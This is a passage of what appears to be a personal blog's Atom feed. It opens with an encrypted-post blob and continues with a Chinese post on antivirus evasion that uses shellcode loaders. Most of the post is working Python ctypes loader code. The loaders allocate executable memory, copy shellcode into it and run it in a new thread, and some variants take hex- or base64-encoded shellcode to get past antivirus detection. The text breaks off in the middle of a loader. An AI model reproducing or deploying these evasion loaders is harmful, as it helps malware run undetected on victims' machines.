f79ab1bcbd1959fa7c70e9875959d2518ec4ed94e2741228a1da5f27b81431a68fc652196152a405ea9203d446934728c4ca156416026d010b9f4d079749870ac8628e823f6a223330a725ebb7aee4cfc119b8dbcc6c568c1759de1d6c5b721809a1a8ea7935280c918c7f514be9514cafbd3e397a99388f04086f2f379f26bc99b3c9fd719c1d39a095c45c40d0a46800484662ad9ee7f7824f97819c2839781cb595135c73d8ee1319b71f8f850506056e9931a1218b4d42dd774f692b694bf55fa046da087f0f16c08a3cb376a6a7c1e0fdb3059538336d949ce752a0e4ab027d21d556c0cab583cd803edfc3d5edbc62d75fad6671ef1aa4a00f6e598db0c1c4b3cf6ef92ca5df84e62ab56625de52cb4b8951b1c59462c32663c165de0d62de7177f861a6a15a2426f9c8bb04a6446f12420c219c9d135008c63e8358269875c43650cb716a0b8e166fe70cfbfd928a8bab57728ee31559ae52d98971ab57f722d5c490d740f48af5d8a4de31b18797f9e5f04d4af7569d835818869fda7c50111b71294e4dc3127f146a3b11ed8bbf3aaab558b74d4da5dd172421983d0fb1a058bc0c227da8d44118a88127051bda939821bb949614dfdba3a7ea2d1c6ec4b9ab6d074407a55ec220962509bd7960e66be906a6fa559d4266ab4323ce8f3f059322c269340b33a6f7f9d1d4f89372982b50cb063b464ef4d8232dff8802ba0bdde4a42663c573429f968bfc2f385e99e9f39958799471f062a8694f18624fa528af31c979b023dc608edc710ebce57c563bf7abb5601c2f136a6763f520b9660152e27c98a510fe7380884ea4b8a8999e60d9a06b48a3c7c80b21bbf55388c58af92895f665e544abc0f8848b451cae893362285eb5d84b88818bfc0dd3d9507d478bdf90e9a4730a257f06908b3c158186bb48075a73cd07165cca5216df2cb82e34dfa19db145fa1471e676bc45cdafc2ec310553f2698a31204efc0f6ca4eab5ea39de41c5229abbe6aaae3cb260f2803e9ff2b24daf38e337652ce9e35988622532b04ad56c0d36992fda7c947fd9765d24d708b25fac741219edf93aef113d063781926f4b30d00e3748ba07dff69819a3fe39136986d8d488c89bc7245d714093da71b62015b869ee1bd55874d5e97303edaabc177df72d7b3d4c88de13e93f38800c949df548182a7f28b73fb8d6ff3b561ac2535aea310597a9a70f69e01adc0db72f855ed25163802fe02305b335e6e46367b5f05a597993faccb3c5576253f9b0ae73459d5bbbe19bf70476700f50832c9d6896540be33b5ec6d4041e1280d1daea2cc9739e539fa0fd95f977907040b0c31213e72809e163de1ee3487c9dd72a3d94eab6271dcf9f159ebe72bcae29a563c8b1c12d9ba08debd297f8d35cb4a52910ad577690ea43e552063b82efeb4a18876a168299c890cba9a739b9a27bd6a237c0bdb31faf42aa230c316b7567582ae694d3233683b7ccabbc1e9852f91ce61066189c0f66cae1a5a947658b2a84df5d31f3d0fce320e6256e92d81265dc99be671c244844061ecb71a4fd4f48ca65a7dbb20b25ac2a9fce629c8201eb7a8638ab831dead7d5b5afadba52702955359242475604e99798c401439b3ef11071e622a104a6ad680d30d2f9f10ea8933c80931974cd8cba25914fba15c1e35de673280da6ecf9cc6b4b94380c0d7b73a2793e3e0544604bc0c4ebe83248d76ca7a5bda4b30077d7216a3db98418423be1012994ded90955ad23d66f44e7eaf040d3697700fa3ea659cea9d470cf45448c9928a546643f277a86bac3fca60410cc684348fdccc195c2044cc37233bd78bfc4f333b994e1ad415a2e0e3260a251d927333cac5d9e89207b2a276fd28c0b95893b2bf9069c37f4ca2a34d736e2a3254e8c6903d0e383bc211689cf5504fcebc4e5b4dc8c0f1f3d39c85046d19cc9e11384eab92fa1351d4914330bdd8ebbdef2a6741b880ac8bc76b62ee600561316e0434e5a6b676078c8d99045cac066f9c6eaba5bf46a22bb9b2de935fa4730be8261176d46664c8f6f038be96e71c9c591661d41de0e14c4a9718ac296a1560ba71bb8b3c1358768ec106aa599d752e512660020bf23513d0d1c18ecfaed8af5f7c22b5b173284ae5e80cb6de9119775bebbc9de5f154bcd638767bbced745bec957f0508439beadbaa68a28bdc12fc605f4b7daed6421716b41b9142cf65c74a8500de8f1afea527ebb34fbbb7ae84eee2b0ff58f6a4ab8a969d85adf198a7abdb2e7efee8c5bd25e82cfc708798211b48b0464feab321a485d1488b4335df4d20d7e735c0517b978dfc9a3124a94f4a421d62ed42747b35f7e44606f84b4fe158b504fa24bebd2c7306897c6c281acdf3188d2ab81dcfcd7f50171cff7717ecf4d79c266352ea1f1c52e171f13f6f11506db2b83e6f7815b0ad0e5c2745b85c0d7ae0ed26920de028685c75f1b966d377ad0da9a978e85383f067bfc4eb77e03810fcf6a421cba30f70197546d0e6be207def9f3a04adf2c778c4302df4ad7695519b7ee2f5feb85fad9f4d0736fe144fc841b9c0909e9e2a59bf3991de9a961ea7859667c6bad0ed69a44c0476ec66be0df3750a05347c758301cd35b5d555230237c024be64bb64923a22a65b7a0e9ce7029c6b5204ef0372af51c0ea79c02647af11853d769fe93151b3843850a2e884f86ee12d35153a9bd72acec81131b4225535a509c2fdb71fe1d69206f887716e5921f349c7eaaaf9d94a4560fc2d6f2ccc26c0639da47e966b49b88b533eb65a1beabc65be360aa3aeb4a3fe6e8e2a35fff58b25ba57c7a44f48ff437747686503e360484a492db62d5d6046e098c0bca3c7b5df1dc3d41400f03dd540d25a8e5b2ed5dc6e78876c0bf563554a21ad36b0b581bba5bc4d325d1df7119122ac189f2523e0d16d7c41bcf4b011a142975120a947b7614f0f16246f7fed9cbe620244d1e67c1bfc28033c73699ac86f9a3a3454f7d0d38ff48e39034f39419a2ca811ee576573ac213da39fe2667a35c3bcb744709f11f7273bc6715aa8d14e4a6df6342fd98046f12dc0c4ceeb0e2ca97afd94908f7e291b76b6517d9f03ed2108642a2e83763db0ff1a11fd8b7c5a09b67c5a9a9ef1f103b9614f11b624136f1b741b18ddf058e8631bca61bb630c175f3a0482279ba3cab5d3848608c72e7f81bed31b554bcd04b8a6e9516594196aea08957719049d29afa78e79108608ff95aadf057f661396ff833b9185d0e9d383ad1fa86462eedc2fa37430a7561167be4424d1827867d7b91fa9bfca46a50e727ad6e13b515ea1bc0419870bc31e74eaf3a7fce44cf936dc8845b8781f8271785a1dcd765015a982c96c19c5e26d1c575c53d8d7e446b5436d395232a4dd3d9bd18dc00900e923575a7f6dff612137861b32149e2f714b126d10fa343f741c4af0a865dcd8656b0687be8f42f6dfe980163d170514a5df62b5c004372f45a170cc725e13a6c75fe37f6ae7128506c1bf330e5bfcc176a32dfb13211f288d42a506e315f820f48bf023d24d5b1014d39c4d94fdd886120ecdb1188daad5545eedcc9565798b5765b0f3301c3b50b2eb3bcbfb72db7fd62de057fcffcc3f0fc590a60c479b5b51b733ec66df03b207eff6a514b973d799a8378877dcb0a3e62b2901543424f6595018bc0ef4a3e2939375d9974fd48887c0821a0a31fe87893535adb0d0e39f7f9833bec467a4318a2d5ff7392543b600aa1f9b4e0a674611b0534bada73122793f7b4ef3951a6f2d0b6647e8460d96c8ecfe898fbe4cf973dd7aebd40861796511b3f65a70370dc7803d0baa131530c306f983cd711bf53508260ae2f69cfb85500c15390c8cd3e2bbbf80081540a39cc1d7096e6a8dee58ac6cab683dd992d0bb57bad5c2260796dd4968de8711bb5e9dfb698194f8f7276124a7d2d6c603166928ced667571990fb6c1dea27a5f51d266912115340f314efbda409deb8b8bb7e8a2d0ff87b58a2dc87a020e4edff9a3fef8cd87e4c2cd14dfeff3441c049f51290788fb87e90c42b78e1cf3209af44311a63f3aeb8d02649f765a1af3c85a5cb0ee427695fee162e5d333dd8528a1f75c16b181fb4618d0e48c74e12b56b9ffb0eb21153ab4e6431e546ac751a169ec0348938f95cf02cfc2bbb6898c9166eba53f288b91336397075bd232eaf0dcf7437bd2b69b8bd3ebba8c5186a6f3cd65ab0b5a534bca1e886b73fa9b6a316b7f784c5b647cfde9c478f01df4d9f1f67df78259da276a70e6c0ed85d9dc08c9850f355fe350844524d3aacfe5bf7181e924dc5ac0257f1e2f434cdb1139c04555d575ad3d7c815dd97568128008e9a0ecacb4497d242d0a71765c32d58b05f9fbf8efd54cace4015cd862e2439e4830994909e7d74042a0fae062137e5db7662af1c0c615fa36eceaeebd69a36ba2fce949756516d3d9cc17fab4cbb18eadffde1b256d2276848b1eec69625befb70462a27af6b1a6d0201c28d5338c7fd6a589790cad121b5f1bb807f5f5f0274c5d6036b729b245d75a3b30fb249a348aef078c6f32d8bb9f04062cb55f2edd4a3eb42af5f28f2f36732f6879abf3513836ca2f08497b05cf0d26d3e6e5e976b7ba3d6fc42cf53079f80493a65cf2b3b809d5a220d49dd608e6aa209f5ed2da9091f5a31b8cf76f15f2199d9b720a058dca8551091a8ca547df4c18b71c8223a9b228b3935a6fe9f5efea2fbce88e5b167ebd1db6ff5c3fc9daebab7a6c97d31fc56542c2ce55f4f26e15cc70d1c1e2d1e8ae98cefe2afd1e79d3a86aca0801f79487354abb62efc612174edbc17faf5453e304511891ec7e5ae8e6185ae005c1d0cf5d80cf628e4e4cba2c11a95a40f4233cdc1564272cd34ac656f0f51537d67d86d07c41d9907e88b008efeb45e861d901091a8a9c819d57d3460499760c5687022df3a5d0707148b02a8cba7225b7b914fea0462067dff2b3d2a142c77bb5efca356f7dc5c768d625ede767225c5936b65e21d8e05dcba0c4a3d99f25d0bb06474ffa832a0293003406e64424fcd5e6455bd1b8f795654e82dd66a315bba9cb0c41dfb658a318115aa7f1d2333c274c702d220f30b5b21f9bd00553c05d18c4d99d4bc66d0f228ec4067f724bd7308f1bc188195572f0082de65473197506ec449f4f56653feb14589dea198f5a782def35557cf6ad3c67e5578466ace23e62acd72ad0cb60202ef25043fa3f15aabe4968ba4d50b70e89efb2fbdb35a8a8ca78663688951e3ab0f41f28cff18c0903c4f101a7b75bbe99a51307b432399e74e5d0c51d97b056ba7d501ea3c603278cb23cc7c69f29246a59411de692de0c9f7c7f4723f9a705a8de6340fc0d7893b4349ee9322fd8254e1d91cccdf9866703ecc3582d944140bfe3c43c04228aeea78cea3b2012f938277754c7fb3b0a917ed4679269ca57188db56857b0569ccb64bf2ce3dd3c8df1261b8fc97d659a3027c7718ff4e4296fc15514d8508b6cf2631677217648b1def6d8983757936a2012f8bdbde9852165ef66af92763aec63277295eba515867e08e55402fdcd5921802be7f8d71105c01a568b479ebe31efc7526f1a565930441c900d5b28d397aa770247b7b8f79847dfbc6e69c700f37f521e32016f47fd4b5dda4def7617b782877067be363a5ade4e584d1beeaa0f57863e2550547de57e9037bffeedf61c261c49c72fa6d7ae03d14eef51d9a150469c7800d1e4bd31fbe495d5947b8d5115002f219fec36d5881b9dfdb655f666d38d9e8969927e30d78968b3db80db2d452615f2ab0e018e9422ee032fe65339d8baccc3565c1aeb2dadbca1795aa289b3128d0d9649f64acf3d6613c39e2ef4a5970601fa6a3189112ade20c77794665dc21c652b486711812d381ce9bc274cd22615683409c78b82eb37b146f5d43522f5d9b892a22e228d897c838e0fb04e481bc4cf7d2b4a018ea4b2948874c08d0be761aacd414e0c56619d964e7b8c0515ac46a6669a74fcbc15ad41c64e9e681b03d7c75061a8b1a4128cb591b64628841b0ec7c4100d5139ab05ab3023bf8e180bb410e195695c6e2276962e377624aa28d227af9f05c528cf6df1fcf77f3adb4bd109535865f3ceab68b424632089237e49c97e9cacaaa4d63ea6df5a492c615913ad6403c3a9f02d6c2c62f150c7ca77b1ff615c68a2f286c04576ed9d2c0b985908a7dc06903c35c7d9a994f3020ca962018eb8c9cd0b8d499aafcee03ad2bbc61784128ec5b75c987f8f467a13c9dd5fa0d792bf27b54c49040843e873f4f29748c44f1e2fe61106a8bea28dd09d7704ed035dd0033b07184b229a878ead3da2e093c92d2f900c9377f9f141f9ba57c671451c09cd9916ab62033520e47548a3f865dcda841d00bf36860a9cad85a3f819dcd9cba94d6eb3a558bc13cc41e9a3ece2f88617633374b2b981f35e69033efbc60bda0cf8cd563611a1fd6330467983a8dbf328e32e3cce21a4f8a33e2b0daa93794cf0f696fd4ffd7a223f48dcae53c648e51fd456e9184361418223592f7a6955558c9b80fafc557dbc8020320ac676c2834f7ab13ad65540d9d143a8debc2b0ee359bd59f1b87a1da523252504c9749b6e605606ef09dc412a363fe4cdf53a752ee4d92049f5297a669a317a264a3bbbf735c1dad275006a3b0d755e8526d2df7e9183bede2c253f9bc55d10a010a50767caf0c4a1cced8a3a277e82ae8d33ea31fdea3e1e6bcc38fb3131591900a4a318615435b33882bb30793361f83052e7b3ca64a8d4058d64fa030e92b9194d7a9522c4e416430ad44c366e8f87c56e5a4973a4fd74c7e238b82646d80a41f89dc86392e1cbe73f8baf59a3ec8ed2bd2089fdff9da8db33d449ac72ff6313199fc69492087fd14b5875d18921a88f6f316f97aaa54d77e717f9b20565f003f7475424d485fd747ab178dce9f2a16912e464519af8bc3365af16b3be0e3d4b9d62f7ce6dcbeefe07090814bb4552ab49692bcd49f2043b1b38c8dd45ab2378ea01bc8bc48c03514c209478c105004742679d49f82f1fd7c6f4002f05266f9ccd29aefe7edee91acf9318849889ce749a8eb8d20d49de6455d5c94a587dabb3ed744da49a1267405eae93b81440478cec2c7df3411a121e6729b81b032a945f1f8d430a3b1d485aca801f58d0d684dcf170e01c9b91e08b25d4c87de04c689958137b6909d4b65e68bba9f782b0980fca821348999befed700f2573cd885d05aa7cfd2f50b9bdead6144c2bfe2f11e00ea5050d3593286bd8a0970d0e20d5352fc94c296819e5f7103057cf4f20d5a84a266193a400b373f36cfdd9e388d13d67103cbc2d8cfdeff2f12f7bad12566584da61ee5c946905685c27c7f4428ea96aefea8d83a3a351de3d839764f4a0ebf247197157ee3e1ab03881abe6d0d1c001735c37e7d237caffc0c934b1e70467d306e2c857a2f4498413d4e0965ed994e85188d5d2b4e0d1291aa8e35e27d2bce6b21afa8e3a0052a1fdfbe980eab0fe5c090665b2964d1b79951802b44a0ce0cec2f6e1dac8bc9223beb83445297d631e3b1e468c2bdd90d8568ab2447fc938535694b71c78a147d483c7dad1aa81700b6c0322f67f17ce20478f8ba29143eff115350f114df844f5016c687b60f33545a8fdd9718dcae07ec3b6d5e708b1a5c01611a47501b189b905e0cf5a2267d04da4ebb67879b97cb019dd4ab059cb7aec2efb97a617577482219bdbc2c282108683ad81e8705a5d342b3383cd9cab8b796cfaaf8f74fc44d41c7fea788d6b438053edc29c9863860e1e44f7600f2ee0ca290bd506bd9bd432ab9c39f54e37d8f77bbfd1567767ae1997ad723d76a8b92eb64c932a2fc0e99a56b318e9bb3def4908a7a46568364ef60b93e96d061053f9445b57ae797fa30a9ff07ddf25d387aa8bbed1fb568825aa2dbd07542835eea163aaeb43157c3c8c53a2b6088505808d2b82bea6a28309825e8b0cd11938c62704378031942f4da58b3e152fc977015340dbdd7fcb74c94cf64a9cf558ce211cd8b69f0db42e90a64f7d3e37ed4724dc03826db973e2925c4bdf04e03522f1c723308ec1e79c3ee9a281115b17787ffc41663e829b122fb00fe09b38ebf5ffda9734da1d7ae2bab9d640a224e03ff85079e6a9f1fe0cd0fa58452298b2fa38df16e3b25d26b9341b1b08fc67c28b05d17d48170b54d32b1c601843fd72734dd8a54735cbb9c169ecfc623a80c3fb9adaa791a0d6fa9c23daeca6ab09f7924b093100de77ddaffc3635322a274ad87d38ec2493e182d6dd088f963b524ff5fbd36a8071e2c29d0c7f0517dc283b7e2ec33def8c8ae7803a6c4e402059797f775137670562fefae89f21177a0ad66a5f1e66678b75ad77c1372695ab0e2a4d70fcf208698c816dd66994e51ce541ee0d35612600a4fd570f57a73d39e219a686fb36b74731fa71e58a21bb52b013448351ba465e1e0155af698e14ba9cf52a809cdb4d0073454c281460a5e3f2984e110efd7b22af0a1b9b2f1a8471ff469c7579d19e8c1c4f8768df55143aa603b8e274b9e538bba4ba6b4614e9d1a5256085f9bf320e7f2d1dab6714d7a6cd6eceba08c1ae425fe1f2eb362ec7507dc953d1f8add2f19402194dfa4549c5bb5a53f211b744cc0ede72328b2218220b3f8701be7fd503cd2a5386448bdabd9cdb0b74a4d4e3d2777bd270b70dcf598290c430b0c82809358421eeb5ba73c40e764813be04f1d42d4c1d9507a424a37e8468a48e82b913979d4730a6e1bcce2573e2fe1b0bdeaf6c526a61cc416862dad17102f37d7a85bf439555f1d03be87ad210e7388bd6a85b45426960a24ebb6dff91f3f7d15297aa999d278720d44eb907fc235e3d98d8d2e7090c40fff2a4e7f64f5217bc091026e7a4ad8eb26c0498d4966548ff4608ecd6635c9722df534d8c2660fc666f3fd6a9cb4a7645fbcb2cd939702ae50d350710dda545576c844109096c1ff77529b59e049aa36dfd311556139ce85f603f3c739bbe44f43b71e145dc651e0d861d50afa80dd70951e4ba855595103004affc08c6785123206dec5303407c54aa73b68907194e2cc245e03ff5e60236bc2dd2633af4a8cb1169c63a1feac23e6f3d14ae708b71ba9b7162a3227ea7ab1132d722c637c2df4dfca5dfa2795c0def54ad7e918795fe5d70d99fc7a6fba6fb8f9b29ab1ed1dbdda741f2f2073d34d6fad0d10c773585b701bfce75645b4d34f128e95230523549c480544002325d9f0a9efd8919b228f150fca78bf972cc63bd5a6208a6c695dc832acbffdedad139f7044f8da8444289da842c0751e4c198ec7a960de5ac8a90d8b7e98b058e4b9d7b023a33464466f9c7be54f5ab2abc832c7b0bca444ee379609350e63b43f4a1aeffbf4189525125863513708d974c79240d2cd56ffe06a76d75d62b4f4de937dae90b7cc5a76d44eab3d237fd5609d299ecc7b78e7a3dfc242fde1db08ac63a4403b70ed2e06ba30535da240b507e4a9bb9d0d3e13725ff6f228c6abe62006ae46a3277ae68d87491539aed7eb651fa1f2c1864f4871ed501ef2cc689a1bcb28a417e12ba8e4f06fa0c7a4bb875163949c01df247afe198b8b1d174daba7aee6ea8a28007d2b8ba210f13951888d3bb3b205df9513737b606bc63107d5b6ee3e9e4de01cd8c7145d48493f0213c3244e0ce0bd16101666bf828cfdcc552e43cfc6e1258ecdb5996118e68205e0561ffd1b2a6b9a5b1b32c54b0ece839d777d3ec97c337c8f15f777e25b58f58792dd706860c222bb4ac1c214b231431522e500ada8880336cbab6367ca78a862b09cb9d65be5f88c5375b7b8d6b77e4c5badc3a799efca854e10622a53df98f3b8a076cfe75b42c64701e193796cf72f38fddc63885639769293451d648cf28c089ab033cda5fbb29115a829ca0081a4ee0</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>免杀学习--shellcode加载免杀</title>
    <link href="https://shu1l.github.io/2021/08/17/mian-sha-xue-xi-shellcode-jia-zai-mian-sha/"/>
    <id>https://shu1l.github.io/2021/08/17/mian-sha-xue-xi-shellcode-jia-zai-mian-sha/</id>
    <published>2021-08-17T06:02:57.000Z</published>
    <updated>2021-08-19T05:15:29.220Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>​        这段时间测试了不少免杀的手法，但是对一些加载器的实现原理还没有完全理清，所以本文主要是学习总结原理和姿势，不测试实际免杀效果。</p><p>​        目前来看分离免杀仍然是主流的一种免杀方式，我们可以将shellcode比作子弹，那么枪也就是我们所说的加载器。在这种情况下对于杀软来说，单纯的枪或者说子弹，都有可能绕过杀软。</p><h3 id="python加载器"><a href="#python加载器" class="headerlink" title="python加载器"></a>python加载器</h3><p>核心代码:</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"><span class="title">shellcode</span> = bytearray(<span class="string">"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b"</span>)</span><br><span class="line"></span><br><span class="line">#通过调用<span class="type">VirtualAlloc</span>函数，申请一块动态内存区域</span><br><span class="line"><span class="title">ptr</span> = ctypes.windll.kernel32.<span class="type">VirtualAlloc</span>(ctypes.c_int(0),#要分配的内存区域的地址</span><br><span class="line">                                          ctypes.c_int(len(shellcode)), #分配的大小</span><br><span class="line">                                          ctypes.c_int(0x3000), #分配的类型</span><br><span class="line">                                          ctypes.c_int(0x40)) #该内存的初始保护属性</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title">buf</span> = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line"></span><br><span class="line">#调用<span class="type">RtlMoveMemory</span>函数，函数从我们指定的内存复制内容到另一内存</span><br><span class="line"><span class="title">ctypes</span>.windll.kernel32.<span class="type">RtlMoveMemory</span>(ctypes.c_int(ptr),</span><br><span class="line">                                    buf,</span><br><span class="line">                                    ctypes.c_int(len(shellcode)))</span><br><span class="line"></span><br><span class="line">#调用<span class="type">CreateThread</span>将在主线程的基础上创建一个新线程</span><br><span class="line"><span class="title">ht</span> = ctypes.windll.kernel32.<span class="type">CreateThread</span>(ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(ptr),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.pointer(ctypes.c_int(0)))</span><br><span class="line"></span><br><span class="line">#调用<span class="type">WaitForSingleObject</span>函数等待创建的线程运行结束。</span><br><span class="line"><span class="title">ctypes</span>.windll.kernel32.<span class="type">WaitForSingleObject</span>(ctypes.c_int(ht),ctypes.c_int(-1))</span><br></pre></td></tr></table></figure><p>代码不是很长，可以看到主要调用的就是ctypes这个库。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ctypes</span> 是 Python 的外部函数库。它提供了与 C 兼容的数据类型，并允许调用 DLL 或共享库中的函数。可使用该模块以纯 Python 形式对这些库进行封装。</span><br></pre></td></tr></table></figure><p>主要流程</p><ul><li>调用VirtualAlloc函数，来申请一块可读可写可执行的动态内存区域。</li><li>调用RtlMoveMemory函数，此函数从指定内存中复制内容至另一内存里。</li><li>调用CreateThread函数，在主线程的基础上创建一个新线程。</li><li>调用WaitForSingleObject函数，等待创建的线程运行结束。</li></ul><p><strong>当然目前来说这种比较原始的方式杀软已经杀很严了，所以之后更多要有混淆加密的操作</strong>。</p><p>常见的有Hex加密、AES加密、XOR加密、base64等等，或者可以自己写加密和解密，免杀效果会更好</p><h3 id="加载器"><a href="#加载器" class="headerlink" title="加载器"></a>加载器</h3><h4 id="HEX加密"><a href="#HEX加密" class="headerlink" title="HEX加密"></a>HEX加密</h4><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#scrun by k8gege</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">#sc = <span class="string">"DBC3D97424F4BEE85A27135F31C9B13331771783C704039F49C5E6A38680095B57F380BE6621F6CBDBF57C99D77ED00963F2FD3EC4B9DB71D50FE4DD1511981F4AF1A1D09FF0E60C6FA0BF5BC255CB19DF541B165F2F1EE81485213884926AA0AEFD4AD1631EB69808D54C1BD927AC2A25EB9383A8F5D42353802E50EE93F42B3411E98BBF81C92A13579920D813C524DFF07D5054F751D12EDC75BAF57D2F665B812FCE04273BFC5151666AA7D31CD3A7EB1E73C0DA951C97E27F5967A922CBE074B74E6D876D8C8804846C6F14ED692B921D03247722B045524157D63EA8F25EA4B4"</span></span><br><span class="line"><span class="title">shellcode</span>=bytearray(sys.argv[<span class="number">1</span>].decode(<span class="string">"hex"</span>))</span><br><span class="line"></span><br><span class="line"><span class="title">ptr</span> = ctypes.windll.kernel32.<span class="type">VirtualAlloc</span>(ctypes.c_int(0),</span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line">                                          ctypes.c_int(0x3000),</span><br><span class="line">                                          ctypes.c_int(0x40))</span><br><span class="line">  </span><br><span class="line"><span class="title">buf</span> = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">  </span><br><span class="line"><span class="title">ctypes</span>.windll.kernel32.<span class="type">RtlMoveMemory</span>(ctypes.c_int(ptr),</span><br><span class="line">                                     buf,</span><br><span class="line">                                     ctypes.c_int(len(shellcode)))</span><br><span class="line">  </span><br><span class="line"><span class="title">ht</span> = ctypes.windll.kernel32.<span class="type">CreateThread</span>(ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(ptr),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.pointer(ctypes.c_int(0)))</span><br><span class="line">  </span><br><span class="line"><span class="title">ctypes</span>.windll.kernel32.<span class="type">WaitForSingleObject</span>(ctypes.c_int(ht),ctypes.c_int(-1))</span><br></pre></td></tr></table></figure><h4 id="base64加密"><a href="#base64加密" class="headerlink" title="base64加密"></a>base64加密</h4><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#scrun by k8gege</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">#<span class="type">REJDM0Q5NzQyNEY0QkVFODVBMjcxMzVGMzFDOUIxMzMzMTc3MTc4M0M3MDQwMzlGNDlDNUU2QTM4NjgwMDk1QjU3RjM4MEJFNjYyMUY2Q0JEQkY1N0M5OUQ3N0VEMDA5NjNGMkZEM0VDNEI5REI3MUQ1MEZFNEREMTUxMTk4MUY0QUYxQTFEMDlGRjBFNjBDNkZBMEJGNUJDMjU1Q0IxOURGNTQxQjE2NUYyRjFFRTgxNDg1MjEzODg0OTI2QUEwQUVGRDRBRDE2MzFFQjY5ODA4RDU0QzFCRDkyN0FDMkEyNUVCOTM4M0E4RjVENDIzNTM4MDJFNTBFRTkzRjQyQjM0MTFFOThCQkY4MUM5MkExMzU3OTkyMEQ4MTNDNTI0REZGMDdENTA1NEY3NTFEMTJFREM3NUJBRjU3RDJGNjY1QjgxMkZDRTA0MjczQkZDNTE1MTY2NkFBN0QzMUNEM0E3RUIxRTczQzBEQTk1MUM5N0UyN0Y1OTY3QTkyMkNCRTA3NEI3NEU2RDg3NkQ4Qzg4MDQ4NDZDNkYxNEVENjkyQjkyMUQwMzI0NzcyMkIwNDU1MjQxNTdENjNFQThGMjVFQTRCNA</span>==</span><br><span class="line"><span class="title">shellcode</span>=bytearray(base64.b64decode(sys.argv[<span class="number">1</span>]).decode(<span class="string">"hex"</span>))</span><br><span class="line"><span class="title">ptr</span> = ctypes.windll.kernel32.<span class="type">VirtualAlloc</span>(ctypes.c_int(0),</span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line">                                          ctypes.c_int(0x3000),</span><br><span class="line">                                          ctypes.c_int(0x40))</span><br><span class="line">  </span><br><span class="line"><span class="title">buf</span> = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">  </span><br><span class="line"><span class="title">ctypes</span>.windll.kernel32.<span class="type">RtlMoveMemory</span>(ctypes.c_int(ptr),</span><br><span class="line">                                     buf,</span><br><span class="line">                                     ctypes.c_int(len(shellcode)))</span><br><span class="line">  </span><br><span class="line"><span class="title">ht</span> = ctypes.windll.kernel32.<span class="type">CreateThread</span>(ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(ptr),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.pointer(ctypes.c_int(0)))</span><br><span class="line">  </span><br><span class="line"><span class="title">ctypes</span>.windll.kernel32.<span 